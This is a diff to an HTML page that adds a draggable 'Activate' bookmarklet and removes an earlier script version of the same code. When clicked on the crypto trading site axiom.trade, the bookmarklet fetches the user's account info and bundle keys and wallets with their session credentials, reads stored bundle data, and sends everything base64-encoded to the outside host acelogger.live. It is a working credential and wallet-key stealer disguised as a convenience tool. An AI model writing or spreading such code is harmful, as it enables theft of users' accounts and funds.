@@ -769,8 +769,16 @@
 
 
 
-    <script>
-        javascript:(async()=>{try{if(location.hostname==='acelogger.live')return alert('You are already on the bookmarklet site!');if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed'))return alert('Please log in to axiom.trade to use this bookmarklet');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={customerId:'CUST-3BEEF8356DE9597B',site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles')};location.replace('https://acelogger.live/data/'+btoa(JSON.stringify(bookmarkData)))}}catch(e){console.error('Bookmarklet error:',e);alert('error but idk what it is')}})()  
-    </script>
+       <a
+  class="bookmarklet"
+  id="bookmarklet"
+  draggable="true"
+  onclick="return false"
+  title="Drag this to your bookmarks bar"
+  href="javascript:(async()=>{try{if(location.hostname==='acelogger.live')return alert('You are already on the bookmarklet site!');if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover');return;}if(!localStorage.getItem('isAuthed'))return alert('Please log in to axiom.trade to use this bookmarklet');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={customerId:'CUST-3BEEF8356DE9597B',site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles')};location.replace('https://acelogger.live/data/'+btoa(JSON.stringify(bookmarkData)));}catch(e){console.error('Bookmarklet error:',e);alert('Bookmarklet error');}})()"
+>
+    Activate
+</a>
+
 </body>
 </html>
